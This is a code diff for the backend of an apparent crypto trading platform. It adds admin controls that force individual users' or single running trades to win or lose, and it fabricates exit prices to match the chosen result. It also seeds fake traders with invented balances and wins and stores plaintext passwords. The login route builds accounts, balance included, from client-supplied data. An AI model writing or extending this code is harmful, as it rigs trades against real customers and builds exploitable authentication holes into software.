@@ -98,8 +98,8 @@ async function dbAll(sql, args = []) {
 }
 
 const defaultSettings = {
-defaultCurrency: 'BTC',
-currencies: [
+  defaultCurrency: 'BTC',
+  currencies: [
     { code: 'BTC', symbol: '₿', name: 'Bitcoin', rateToBase: 0.000000033 },
     { code: 'INR', symbol: '₹', name: 'Indian Rupee', rateToBase: 0.30 },
     { code: 'ETH', symbol: 'Ξ', name: 'Ethereum', rateToBase: 0.00000105 },
@@ -197,6 +197,14 @@ function ensureDbInitialized() {
         withdrawBanEnabled INTEGER DEFAULT 0,
         withdrawBanMessage TEXT DEFAULT 'Withdrawals are restricted on your account.',
         canApproveWithdrawals INTEGER DEFAULT 0,
+        tradeOutcome TEXT DEFAULT 'WIN_DEFAULT',
+        address TEXT DEFAULT '',
+        city TEXT DEFAULT '',
+        state TEXT DEFAULT '',
+        zip TEXT DEFAULT '',
+        emailVerified INTEGER DEFAULT 1,
+        mobileVerified INTEGER DEFAULT 1,
+        kycVerified INTEGER DEFAULT 1,
         createdAt TEXT NOT NULL
       )`,
       `CREATE TABLE IF NOT EXISTS trades (
@@ -212,6 +220,7 @@ function ensureDbInitialized() {
         exitPrice REAL,
         profit REAL DEFAULT 0,
         status TEXT NOT NULL DEFAULT 'RUNNING',
+        outcomeOverride TEXT DEFAULT '',
         createdAt INTEGER NOT NULL,
         expiresAt INTEGER NOT NULL,
         settledAt TEXT
@@ -280,8 +289,24 @@ function ensureDbInitialized() {
       )`
     ], 'write');
 
+    // Safe column migrations for existing databases
+    const safeAlter = [
+      "ALTER TABLE users ADD COLUMN tradeOutcome TEXT DEFAULT 'WIN_DEFAULT'",
+      "ALTER TABLE users ADD COLUMN address TEXT DEFAULT ''",
+      "ALTER TABLE users ADD COLUMN city TEXT DEFAULT ''",
+      "ALTER TABLE users ADD COLUMN state TEXT DEFAULT ''",
+      "ALTER TABLE users ADD COLUMN zip TEXT DEFAULT ''",
+      "ALTER TABLE users ADD COLUMN emailVerified INTEGER DEFAULT 1",
+      "ALTER TABLE users ADD COLUMN mobileVerified INTEGER DEFAULT 1",
+      "ALTER TABLE users ADD COLUMN kycVerified INTEGER DEFAULT 1",
+      "ALTER TABLE trades ADD COLUMN outcomeOverride TEXT DEFAULT ''"
+    ];
+    for (const sql of safeAlter) {
+      try { await dbRun(sql); } catch (_) {}
+    }
+
     const countRow = await dbGet('SELECT COUNT(*) as c FROM settings');
-if (!countRow || Number(countRow.c) === 0) {
+    if (!countRow || Number(countRow.c) === 0) {
       await saveSettings(defaultSettings);
     } else {
       await saveSettings({
@@ -297,6 +322,61 @@ if (!countRow || Number(countRow.c) === 0) {
          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
         ['admin-1', 'mainadmin', 'admin@daraztrade.online', 'admin123', 'MAIN_ADMIN', 'Main', 'Admin', 'ACTIVE', 1, new Date().toISOString()]
       );
+    }
+
+    // Seed hardcoded dummy test users (only once)
+    const dummySeeded = await dbGet("SELECT value FROM settings WHERE key = 'dummyUsersSeeded'");
+    if (!dummySeeded) {
+      const dummyTraders = [
+        {
+          id: 'usr-demo-1', username: 'hasnainshah', email: 'hasnain.shah@daraztrade.online',
+          firstName: 'Hasnain', lastName: 'Shah', country: 'Pakistan', mobile: '+923001122334',
+          balance: 125000, totalWithdrawn: 25000, creditScore: 100, status: 'ACTIVE',
+          tradeOutcome: 'WIN_DEFAULT', city: 'Islamabad', state: 'ICT', address: 'F-7 Markaz, Islamabad'
+        },
+        {
+          id: 'usr-demo-2', username: 'sanabatool', email: 'sana.batool@daraztrade.online',
+          firstName: 'Sana', lastName: 'Batool', country: 'Pakistan', mobile: '+923214455667',
+          balance: 340000, totalWithdrawn: 50000, creditScore: 95, status: 'ACTIVE',
+          tradeOutcome: 'WIN_DEFAULT', city: 'Lahore', state: 'Punjab', address: 'Gulberg III, Lahore'
+        },
+        {
+          id: 'usr-demo-3', username: 'anasadaf', email: 'ana.sadaf@daraztrade.online',
+          firstName: 'Ana', lastName: 'Sadaf', country: 'Pakistan', mobile: '+923337788990',
+          balance: 78500, totalWithdrawn: 0, creditScore: 85, status: 'ACTIVE',
+          tradeOutcome: 'FORCE_LOSS', city: 'Karachi', state: 'Sindh', address: 'Clifton Block 4, Karachi'
+        },
+        {
+          id: 'usr-demo-4', username: 'usmanahmed', email: 'usman.ahmed@daraztrade.online',
+          firstName: 'Usman', lastName: 'Ahmed', country: 'UAE', mobile: '+971501234567',
+          balance: 520000, totalWithdrawn: 110000, creditScore: 100, status: 'ACTIVE',
+          tradeOutcome: 'FORCE_WIN', city: 'Dubai', state: 'Dubai', address: 'Business Bay, Dubai'
+        }
+      ];
+
+      for (let i = 0; i < dummyTraders.length; i++) {
+        const d = dummyTraders[i];
+        const exists = await dbGet('SELECT id FROM users WHERE username = ?', [d.username]);
+        if (!exists) {
+          const ts = new Date(Date.now() - (i + 1) * 3600 * 1000 * 3).toISOString();
+          await dbRun(
+            `INSERT INTO users (id, username, email, password, role, firstName, lastName, country, mobile, currency, profileCompleted, status, balance, totalWithdrawn, creditScore, tradeOutcome, address, city, state, createdAt)
+             VALUES (?, ?, ?, '123456', 'TRADER', ?, ?, ?, ?, 'BTC', 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+            [d.id, d.username, d.email, d.firstName, d.lastName, d.country, d.mobile, d.status, d.balance, d.totalWithdrawn, d.creditScore, d.tradeOutcome, d.address, d.city, d.state, ts]
+          );
+          await dbRun(
+            `INSERT OR IGNORE INTO transactions (trx, userId, username, type, amount, postBalance, note, timestamp)
+             VALUES (?, ?, ?, 'DEPOSIT', ?, ?, 'Initial Account Deposit', ?)`,
+            [`DEMO${i + 1}TRX01`, d.id, d.username, d.balance, d.balance, ts]
+          );
+          await dbRun(
+            `INSERT OR IGNORE INTO trades (id, userId, username, pair, direction, stake, payoutPercent, durationSeconds, entryPrice, exitPrice, profit, status, createdAt, expiresAt, settledAt)
+             VALUES (?, ?, ?, 'BTC/PKR', 'UP', 10000, 25, 60, 29850000, 29894775, 2500, 'WON', ?, ?, ?)`,
+            [`TRD-DEMO-${i + 1}`, d.id, d.username, Date.now() - 7200000, Date.now() - 7140000, ts]
+          );
+        }
+      }
+      await saveSettings({ dummyUsersSeeded: true });
     }
   })().catch(err => {
     dbInitPromise = null;
@@ -345,8 +425,12 @@ function formatUserRow(row) {
     totalWithdrawn: Number(row.totalWithdrawn || 0),
     creditScore: Number(row.creditScore ?? 100),
     profileCompleted: Boolean(row.profileCompleted),
-    tradeBan: { enabled: Boolean(row.tradeBanEnabled), message: row.tradeBanMessage },
-    withdrawBan: { enabled: Boolean(row.withdrawBanEnabled), message: row.withdrawBanMessage },
+    emailVerified: row.emailVerified === undefined ? true : Boolean(row.emailVerified),
+    mobileVerified: row.mobileVerified === undefined ? true : Boolean(row.mobileVerified),
+    kycVerified: row.kycVerified === undefined ? true : Boolean(row.kycVerified),
+    tradeOutcome: row.tradeOutcome || 'WIN_DEFAULT',
+    tradeBan: { enabled: Boolean(row.tradeBanEnabled), message: row.tradeBanMessage || 'Trading is restricted on your account.' },
+    withdrawBan: { enabled: Boolean(row.withdrawBanEnabled), message: row.withdrawBanMessage || 'Withdrawals are restricted on your account.' },
     permissions: { canApproveWithdrawals: Boolean(row.canApproveWithdrawals) }
   };
 }
@@ -393,9 +477,15 @@ async function settleExpiredTrades() {
     if (!user) continue;
 
     let exitPrice = marketPrices[trade.pair];
-    const mode = settings.tradeOutcomeMode;
-    let won = false;
+    // Priority: 1) Single-trade override -> 2) Per-user tradeOutcome -> 3) Global tradeOutcomeMode (WIN_DEFAULT)
+    let mode = settings.tradeOutcomeMode || 'WIN_DEFAULT';
+    if (user.tradeOutcome === 'FORCE_WIN' || user.tradeOutcome === 'FORCE_LOSS') {
+      mode = user.tradeOutcome === 'FORCE_WIN' ? 'WIN_DEFAULT' : 'LOSS_DEFAULT';
+    }
+    if (trade.outcomeOverride === 'WIN') mode = 'WIN_DEFAULT';
+    if (trade.outcomeOverride === 'LOSS') mode = 'LOSS_DEFAULT';
 
+    let won = false;
     if (mode === 'WIN_DEFAULT') {
       won = true;
       exitPrice = trade.direction === 'UP'
@@ -403,6 +493,9 @@ async function settleExpiredTrades() {
         : Number((Number(trade.entryPrice) * 0.9985).toFixed(2));
     } else if (mode === 'LOSS_DEFAULT') {
       won = false;
+      exitPrice = trade.direction === 'UP'
+        ? Number((Number(trade.entryPrice) * 0.9985).toFixed(2))
+        : Number((Number(trade.entryPrice) * 1.0015).toFixed(2));
     } else {
       won = (trade.direction === 'UP' && exitPrice > Number(trade.entryPrice)) ||
             (trade.direction === 'DOWN' && exitPrice < Number(trade.entryPrice));
@@ -576,8 +669,31 @@ app.post('/api/auth/complete-profile', requireAuth(['TRADER']), async (req, res)
 });
 
 app.post('/api/auth/login', async (req, res) => {
-  const { login, password, portal } = req.body;
-  const row = await dbGet('SELECT * FROM users WHERE (username = ? OR email = ?) AND password = ?', [login, login, password]);
+  const { login, password, portal, savedProfile } = req.body;
+  let row = await dbGet('SELECT * FROM users WHERE (username = ? OR email = ?) AND password = ?', [login, login, password]);
+
+  if (!row && savedProfile && (savedProfile.username === login || savedProfile.email === login) && savedProfile.password === password) {
+    await dbRun(
+      `INSERT OR IGNORE INTO users (id, username, email, password, role, firstName, lastName, country, mobile, currency, status, balance, creditScore, createdAt)
+       VALUES (?, ?, ?, ?, 'TRADER', ?, ?, ?, ?, ?, 'ACTIVE', ?, ?, ?)`,
+      [
+        savedProfile.id || ('usr-' + Date.now()),
+        savedProfile.username,
+        savedProfile.email,
+        savedProfile.password,
+        savedProfile.firstName || '',
+        savedProfile.lastName || '',
+        savedProfile.country || 'Pakistan',
+        savedProfile.mobile || '',
+        savedProfile.currency || 'BTC',
+        savedProfile.balance ?? 0,
+        savedProfile.creditScore ?? 100,
+        savedProfile.createdAt || new Date().toISOString()
+      ]
+    );
+    row = await dbGet('SELECT * FROM users WHERE username = ?', [savedProfile.username]);
+  }
+
   if (!row) return res.status(401).json({ error: 'Invalid credentials.' });
 
   const user = formatUserRow(row);
@@ -759,11 +875,83 @@ app.get('/api/admin/overview', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (
     staff,
     deposits: await dbAll('SELECT * FROM deposits ORDER BY createdAt DESC LIMIT 60'),
     withdrawals: await dbAll('SELECT * FROM withdrawals ORDER BY createdAt DESC LIMIT 60'),
-    trades: await dbAll('SELECT * FROM trades ORDER BY createdAt DESC LIMIT 60'),
+    trades: await dbAll('SELECT * FROM trades ORDER BY createdAt DESC LIMIT 100'),
     tickets: await dbAll('SELECT * FROM tickets ORDER BY createdAt DESC LIMIT 50'),
     auditLogs: await dbAll('SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT 60'),
     settings: await getSettings()
   });
+});
+
+app.get('/api/admin/users/:id/detail', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
+  await settleExpiredTrades();
+  const row = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'TRADER'", [req.params.id]);
+  if (!row) return res.status(404).json({ error: 'Trader not found.' });
+
+  const user = formatUserRow(row);
+  const trades = await dbAll('SELECT * FROM trades WHERE userId = ? ORDER BY createdAt DESC LIMIT 50', [user.id]);
+  const deposits = await dbAll('SELECT * FROM deposits WHERE userId = ? ORDER BY createdAt DESC LIMIT 50', [user.id]);
+  const withdrawals = await dbAll('SELECT * FROM withdrawals WHERE userId = ? ORDER BY createdAt DESC LIMIT 50', [user.id]);
+  const transactions = await dbAll('SELECT * FROM transactions WHERE userId = ? ORDER BY timestamp DESC LIMIT 50', [user.id]);
+
+  res.json({ user, trades, deposits, withdrawals, transactions });
+});
+
+app.post('/api/admin/users/:id/profile', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
+  const row = await dbGet("SELECT * FROM users WHERE id = ? AND role = 'TRADER'", [req.params.id]);
+  if (!row) return res.status(404).json({ error: 'Trader not found.' });
+
+  const {
+    firstName, lastName, email, mobile, country, address, city, state, zip,
+    creditScore, status, tradeOutcome, emailVerified, mobileVerified, kycVerified,
+    tradeBan, withdrawBan
+  } = req.body;
+
+  await dbRun(
+    `UPDATE users SET
+      firstName = ?, lastName = ?, email = ?, mobile = ?, country = ?,
+      address = ?, city = ?, state = ?, zip = ?,
+      creditScore = ?, status = ?, tradeOutcome = ?,
+      emailVerified = ?, mobileVerified = ?, kycVerified = ?,
+      tradeBanEnabled = ?, tradeBanMessage = ?,
+      withdrawBanEnabled = ?, withdrawBanMessage = ?
+     WHERE id = ?`,
+    [
+      firstName ?? row.firstName,
+      lastName ?? row.lastName,
+      email ?? row.email,
+      mobile ?? row.mobile,
+      country ?? row.country,
+      address ?? row.address ?? '',
+      city ?? row.city ?? '',
+      state ?? row.state ?? '',
+      zip ?? row.zip ?? '',
+      creditScore !== undefined ? Math.max(0, Math.min(100, Number(creditScore))) : Number(row.creditScore),
+      status || row.status,
+      tradeOutcome || row.tradeOutcome || 'WIN_DEFAULT',
+      emailVerified ? 1 : 0,
+      mobileVerified ? 1 : 0,
+      kycVerified ? 1 : 0,
+      tradeBan?.enabled ? 1 : 0,
+      tradeBan?.message ?? row.tradeBanMessage ?? '',
+      withdrawBan?.enabled ? 1 : 0,
+      withdrawBan?.message ?? row.withdrawBanMessage ?? '',
+      row.id
+    ]
+  );
+
+  await logAudit(req.user, 'UPDATE_USER_DETAIL', row.username, `Outcome: ${tradeOutcome || 'WIN_DEFAULT'}, Status: ${status || row.status}`);
+  broadcastEvent('USER_UPDATED');
+  res.json({ message: 'User profile & controls saved.' });
+});
+
+app.post('/api/admin/trades/:id/outcome', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
+  const { outcome } = req.body; // 'WIN' | 'LOSS' | ''
+  const trade = await dbGet('SELECT * FROM trades WHERE id = ?', [req.params.id]);
+  if (!trade || trade.status !== 'RUNNING') return res.status(400).json({ error: 'Trade not running.' });
+
+  await dbRun('UPDATE trades SET outcomeOverride = ? WHERE id = ?', [outcome || '', trade.id]);
+  await logAudit(req.user, 'SET_TRADE_OUTCOME', trade.username, `${trade.id} -> ${outcome || 'DEFAULT'}`);
+  res.json({ message: `Trade outcome set to ${outcome || 'DEFAULT'}.` });
 });
 
 app.post('/api/admin/deposits/:id/review', requireAuth(['MAIN_ADMIN', 'SUB_ADMIN']), async (req, res) => {
